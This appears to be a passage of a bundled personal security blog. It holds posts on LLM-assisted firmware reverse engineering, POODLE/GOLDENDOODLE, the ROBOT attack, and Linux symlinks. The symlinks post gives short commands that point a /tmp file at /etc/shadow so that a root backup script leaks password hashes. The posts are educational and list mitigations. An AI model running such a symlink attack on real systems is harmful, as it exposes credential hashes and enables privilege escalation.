    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,qg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Xg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Kg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
